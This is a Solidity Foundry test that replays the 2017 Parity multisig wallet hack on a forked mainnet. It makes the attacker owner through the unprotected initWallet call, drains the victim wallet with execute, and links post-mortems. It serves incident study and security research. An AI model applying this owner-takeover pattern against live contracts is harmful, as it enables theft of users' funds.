// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : 153,037 ETH (~$30M)
// Attacker : 0xB3764761E297D6f121e79C32A65829Cd1dDb4D32
// Attack Contract : N/A
// Vulnerable Contract : 0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e
// Attack Tx : https://etherscan.io/tx/0x9dbf0326a03a2a3719c27be4fa69aacc9857fd231a8d9dcaede4bb083def75ec
// Attack Tx : https://etherscan.io/tx/0xeef10fc5170f669b86c4cd0444882a96087221325f8bf2f55d6188633aa7be7c

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e#code

// @Analysis
// Post-mortem : https://www.openzeppelin.com/news/on-the-parity-wallet-multisig-hack-405a8c12e8f7
// Hacking God : https://haseebq.com/a-hacker-stole-31m-of-ether/

interface IParityWallet {
    function initWallet(address[] memory _owners, uint256 _required, uint256 _daylimit) external;
    function execute(address _to, uint256 _value, bytes calldata _data) external;
    function isOwner(address _addr) external view returns (bool);
}

contract ContractTest is Test {
    address internal constant ATTACKER = 0xB3764761E297D6f121e79C32A65829Cd1dDb4D32;
    IParityWallet internal constant VICTIM_WALLET = IParityWallet(0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e);
    uint256 internal constant FORK_BLOCK = 4_043_799;
    uint256 internal constant STOLEN_AMOUNT = 82_189_932_605_820_062_911_880;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);

        vm.label(ATTACKER, "attacker");
        vm.label(address(VICTIM_WALLET), "Parity victim wallet");
    }

    function testExploit() public {
        assertEq(address(VICTIM_WALLET).balance, STOLEN_AMOUNT);
        assertFalse(VICTIM_WALLET.isOwner(ATTACKER));

        address[] memory owners = new address[](1);
        owners[0] = ATTACKER;

        vm.startPrank(ATTACKER);
        VICTIM_WALLET.initWallet(owners, 0, STOLEN_AMOUNT);

        assertTrue(VICTIM_WALLET.isOwner(ATTACKER));

        uint256 attackerBalanceBefore = ATTACKER.balance;
        VICTIM_WALLET.execute(ATTACKER, STOLEN_AMOUNT, "");
        vm.stopPrank();

        assertEq(address(VICTIM_WALLET).balance, 0);
        assertEq(ATTACKER.balance - attackerBalanceBefore, STOLEN_AMOUNT);
    }
}
